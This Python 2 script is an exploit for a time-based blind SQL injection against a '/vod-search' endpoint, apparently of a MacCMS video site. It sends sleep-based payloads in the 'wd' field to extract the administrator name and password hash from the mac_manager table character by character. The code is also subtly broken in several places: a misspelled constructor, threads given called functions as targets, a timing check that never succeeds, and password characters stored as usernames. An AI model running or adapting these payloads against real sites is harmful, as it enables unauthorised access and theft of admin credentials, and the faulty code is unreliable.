import requests
import time
import threading


class Exploit():
    def __int__(self):
        self.Url = None
        self.Protocol = 'http'
        self.Timeout = 3
        self.TimebasedFlag = 3
        self.Threads = 10
        self.TaskList = []
        self.Status = True
        self.Queue = None
        self.Username = {}
        self.Password = {}
        self.CharList = 'qwertyyuiopasdfghjklzxcvbnm1234567890_-+=()'
        self.AscList = '1234567890abcdef'
        self.UserPasslength = 0
        pass


    def Exploit(self):
        if not self.Url:
            print '[!] URL not specified.'
            return
        if not self.Timeout or not str(self.Timeout).isdigit():
            print '[!] Timeout not specified, using 3.'
            self.Timeout = 3
        if not self.Threads or not str(self.Threads).isdigit():
            print '[!] Threads not specified, using 10.'
            self.Threads = 10
        if not self.TimebasedFlag:
            print '[!] Time flag not specified, using 3.'
            self.TimebasedFlag = 3
        self.Timeout = int(self.Timeout)
        self.Threads = int(self.Threads)
        self.TimebasedFlag = int(self.TimebasedFlag)
        try:
            while True:
                timenow = time.time()
                requests.get('%s://%s' %(self.Protocol, self.Url), timeout=int(self.Timeout))
                if time.time() - timenow > self.TimebasedFlag:
                    print '[*] Connection is not stable. Increasing timeout by 1.'
                    self.TimebasedFlag += 1
                    continue
                break
            self.UserPasslength = self.GetUserpassLength()
            if not self.UserPasslength:
                print '[!] Failed to get target Username-password length.'
                return
            counter = 0
            while counter < self.UserPasslength:
                if len(self.TaskList) < self.Threads:
                    thread = threading.Thread(target=self.CheckUsername(counter))
                    thread.start()
                    self.TaskList.append(thread)
                    counter += 1
            for item in self.TaskList:
                item.join()
            keys = self.Username.keys()
            keys.sort()
            Username = ''
            for item in keys:
                Username += self.Username[item]
            counter = 0
            while counter < 32:
                if len(self.TaskList) < self.Threads:
                    thread = threading.Thread(target=self.CheckPassword(counter))
                    thread.start()
                    self.TaskList.append(thread)
                    counter += 1
            for item in self.TaskList:
                item.join()
            keys = self.Password.keys()
            keys.sort()
            Password = ''
            for item in keys:
                self.Password += self.Password[item]
            print '[+] Fetch completed.'
            print '[*] Incoming identify.'
            print ' |    %s: %s' %(Username, Password)
            print '[*] Output completed.'
        except Exception ,e:
            print '[!] Failed to fetch user identify: %s' %(str(e))
        return


    def GetUserpassLength(self):
        try:

            for i in range(1, 40):
                currtime = time.time()
                requests.post('%s://%s/vod-search' %(self.Protocol, self.Url), {'wd': '))||if((select%0bascii(length((select(m_name)``from(mac_manager))))=' + str(ord(str(i))) + '),(`sleep`( '+ str(self.TimebasedFlag) +')),0)#%25%35%63'}, timeout = int(self.Timeout))
                if time.time()-currtime > self.TimebasedFlag:
                    print '[*] Length of target admin name is %i.' %(i)
                    self.AdminLength = i
            return self.AdminLength
        except Exception, e:
            print '[!] Failed to fetch target length: %s' %(str(e))
        return


    def CheckUsername(self,seq):
        item = 'Not specified'
        try:
            for item in self.CharList:
                currtime = time.time()
                requests.post('%s://%s/vod-search' %(self.Protocol, self.Url), {'wd': '))||if((select%0bascii(substr((select(m_name)``from(mac_manager)),' + seq +',1))='+ str(ord(item)) +'),(`sleep`(3)),0)#%25%35%63'}, timeout=int(self.Timeout))
                if time.time() < currtime:
                    self.Username[seq] = item
                    break
        except requests.Timeout:
            print '[!] Timed out fetching username with char %s.' %(item)
            self.Username[seq] = item if item != 'Not specified' else '1'
        return


    def CheckPassword(self, seq):
        item = 'Not specified'
        try:
            for item in self.AscList:
                currtime = time.time()
                requests.post('%s://%s/vod-search' % (self.Protocol, self.Url), {
                    'wd': '))||if((select%0bascii(substr((select(m_password)``from(mac_manager)),' + seq + ',1))=' + str(ord(item)) + '),(`sleep`(3)),0)#%25%35%63'}, timeout=int(self.Timeout))
                if time.time() < currtime:
                    self.Username[seq] = item
                    break
        except requests.Timeout:
            print '[!] Timed out fetching password with char %s.' %(item)
            self.Username[seq] = '1' if item == 'Not specified' else item
        return

    